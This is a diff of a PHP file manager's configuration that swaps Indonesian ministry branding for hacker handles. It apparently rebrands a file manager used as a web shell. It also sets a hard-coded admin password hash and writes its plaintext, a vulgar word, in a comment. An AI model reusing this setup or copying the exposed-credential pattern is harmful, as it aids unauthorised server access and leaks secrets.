@@ -2,19 +2,11 @@
 //Default Configuration
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
 
-/**
- * System | File Manager Kominfo
- * @author KOMINFO @2023
- * @email kontak@kominfo.go.id
- * @Menkominfo Budi Arie Setiadi
- * @link https://www.kominfo.go.id/
- */
-
 //TFM version
 define('VERSION', '2.5.3');
 
 //Application Title
-define('APP_TITLE', 'DATA CENTER INDONESIA');
+define('APP_TITLE', 'Br0ken33 File Manager');
 
 // --- EDIT BELOW CONFIGURATION CAREFULLY ---
 
@@ -23,7 +15,7 @@ define('APP_TITLE', 'DATA CENTER INDONESIA');
 // Is independent from IP white- and blacklisting
 $use_auth = true;
 $auth_users = array(
-    'adm' => '$2a$12$EHwEtx03XO3CqMWfJ/1SnO2qxnj0dMEMIaiixvKTMxYx9ejDQXs7m', 
+    'adm' => '$2y$10$x.nRO53SKSAzzXLo0yF/UekUhBI1MNYlI5LmKDOuZ8AZkzZq/2LwS', // Kontol$$##
 );
 
 // Readonly users
@@ -386,7 +378,7 @@ if ($use_auth) {
                         </div>
                         <div class="footer text-center">
                             &mdash;&mdash; &copy;
-                            <a href="" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">KOMINFO @2023</a> &mdash;&mdash;
+                            <a href="" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">Br0kenBrain @2024</a> &mdash;&mdash;
                         </div>
                     </div>
                 </div>
